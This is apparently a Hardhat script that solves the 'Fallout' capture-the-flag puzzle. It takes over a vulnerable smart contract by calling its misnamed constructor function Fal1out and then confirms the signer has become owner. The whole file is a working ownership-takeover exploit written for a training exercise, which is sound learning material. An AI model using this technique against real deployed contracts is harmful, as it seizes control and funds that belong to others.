// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xf41B47c54dEFF12f8fE830A411a09D865eBb120E";
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096";

async function main() {
    console.log("\nScript to solve Fallout puzzle \n========================================== \n");

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Fallout", CONTRACT_ADDRESS, attacker);

    await contract.Fal1out({ value: 10 });
    const owner = await contract.owner();

    if (owner === attacker.address) {
        console.log("Congratulations! Now submit the solution");
    } else {
        console.log("Something went wrong.");
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
